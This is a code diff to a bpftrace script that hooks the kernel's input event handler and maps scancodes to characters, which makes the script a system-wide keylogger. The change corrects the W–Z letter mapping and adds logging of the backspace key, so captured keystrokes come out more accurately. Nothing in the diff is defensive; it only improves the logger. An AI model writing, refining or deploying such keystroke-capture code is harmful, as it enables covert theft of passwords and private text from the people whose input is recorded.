@@ -57,9 +57,10 @@ BEGIN
     @keys[20] = 0x54 + 32; // T
     @keys[22] = 0x55 + 32; // U
     @keys[47] = 0x56 + 32; // V
-    @keys[45] = 0x57 + 32; // X
-    @keys[21] = 0x58 + 32; // Y
-    @keys[44] = 0x59 + 32; // Z
+    @keys[17] = 0x57 + 32; // W
+    @keys[45] = 0x58 + 32; // X
+    @keys[21] = 0x59 + 32; // Y
+    @keys[44] = 0x5a + 32; // Z
 
     @keys[26] = 0x5b; // {
     @keys[27] = 0x5d; // }
@@ -134,6 +135,10 @@ kprobe:input_handle_event
         }
         if ($code == 0x3a) {
             printf("[CAPS-LOCK]");
+            $code = 0; // RETURN;
+        }
+        if ($code == 0x0e) {
+            printf("[DEL]");
             $code = 0; // RETURN;
         }
         // Ignore 0 and ESC
